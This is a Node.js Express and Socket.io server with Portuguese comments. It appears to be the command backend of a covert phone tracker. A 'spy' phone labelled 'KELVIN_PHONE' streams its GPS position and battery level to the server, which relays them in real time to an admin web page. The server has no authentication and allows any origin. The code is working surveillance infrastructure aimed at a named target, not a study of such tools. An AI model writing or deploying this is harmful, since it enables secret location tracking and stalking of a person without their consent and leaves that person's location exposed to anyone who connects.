const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*", // Permite conexão de qualquer lugar do mundo
        methods: ["GET", "POST"]
    }
});

app.set('view engine', 'ejs');
app.use(express.static('public'));

// Rotas
app.get('/', (req, res) => res.render('home'));
app.get('/gps', (req, res) => res.render('gps'));
app.get('/zap', (req, res) => res.render('zap'));

// --- MEMÓRIA DO SERVIDOR ---
// Guarda a última posição conhecida para quando você abrir o site
let lastKnownData = null;

io.on('connection', (socket) => {
    const role = socket.handshake.query.role;

    // --- CENÁRIO 1: O ESPIÃO (CELULAR) CONECTOU ---
    if (role === 'target') {
        console.log(`[ALVO CONECTADO] ID: ${socket.id}`);
        
        // Se o servidor reiniciar, avisamos o app para mandar dados logo
        socket.emit('request_update'); 

        socket.on('report_location', (data) => {
            // 1. Atualiza a memória do servidor
            lastKnownData = {
                deviceId: "KELVIN_PHONE",
                lat: data.lat,
                lng: data.lng,
                battery: data.battery,
                status: "ONLINE",
                timestamp: new Date().toLocaleTimeString()
            };

            // 2. Mostra no terminal (sem travar)
            process.stdout.write(`\r[RASTREAMENTO] Lat: ${data.lat.toFixed(5)} | Lng: ${data.lng.toFixed(5)}   `);

            // 3. Manda para o Site em tempo real
            io.emit('gps_update', lastKnownData);
        });

        socket.on('disconnect', () => {
            console.log(`\n[ALVO PERDIDO] Conexão encerrada.`);
            if(lastKnownData) lastKnownData.status = "OFFLINE (Última Posição)";
            io.emit('target_status', { status: 'OFFLINE' });
        });

    // --- CENÁRIO 2: O ADMIN (VOCÊ NO SITE) CONECTOU ---
    } else if (role === 'admin') {
        // Assim que você abre o site, se já tivermos dados, enviamos na hora!
        // Não precisa esperar o celular mandar o próximo sinal.
        if (lastKnownData) {
            socket.emit('gps_update', lastKnownData);
        }
    } 
});

// Configuração essencial para o Render
const PORT = process.env.PORT || 3000;

http.listen(PORT, () => {
    console.log(`[SISTEMA NA NUVEM] Rodando na porta ${PORT}`);
});